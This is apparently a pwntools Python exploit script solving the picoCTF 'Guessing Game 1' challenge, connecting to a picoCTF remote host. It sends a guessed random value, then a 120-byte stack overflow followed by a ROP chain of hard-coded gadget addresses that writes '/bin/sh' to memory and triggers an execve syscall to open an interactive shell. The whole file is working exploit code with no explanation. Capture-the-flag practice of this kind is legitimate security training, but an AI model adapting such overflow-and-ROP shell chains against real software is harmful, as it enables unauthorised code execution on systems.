import os
from pwn import *
###################setup file and elf files####################

level = "Guessing Game 1"
ip = "jupiter.challenges.picoctf.org:38467"
os.chdir("/home/ayush/Work/picoCTF/BinaryExploitation/"+level)
print(os.getcwd())

context.arch = 'amd64'
elf = ELF("./vuln")

######################start process##########################

# r = process("./vuln")
r = remote(ip.split(':')[0], ip.split(':')[1])

#####################ROP gadgets#################################

pop_rax = struct.pack("l", 0x4163f4)
nul_rax = struct.pack("l", 0x445950)
pop_rdi = struct.pack("l", 0x400696)
pop_rsi = struct.pack("l", 0x410ca3)
write_to_rsi = struct.pack("l", 0x47ff91)
pop_rdx = struct.pack("l", 0x44a6b5)
syscall = struct.pack("l", 0x40137c)
data_address = struct.pack("l", 0x6ba0e0)
next_data_address = struct.pack("l", 0x6ba0e8)
bin_str = struct.pack("l", 0x68732f6e69622f)
execve_syscall = struct.pack("l", 0x3b)

#####################making ROP chain###############################

overflow = b"A"*120
payload = overflow
payload += pop_rsi
payload += data_address
payload += pop_rax
payload += bin_str
payload += write_to_rsi
payload += pop_rdi
payload += data_address
payload += pop_rsi
payload += next_data_address
payload += pop_rdx
payload += next_data_address
payload += nul_rax
payload += write_to_rsi
payload += pop_rax
payload += execve_syscall
payload += syscall

################# intraction to process to get shell#############################

r.sendlineafter("?", "84")   # the first rand value
r.sendlineafter("?", payload)

r.interactive()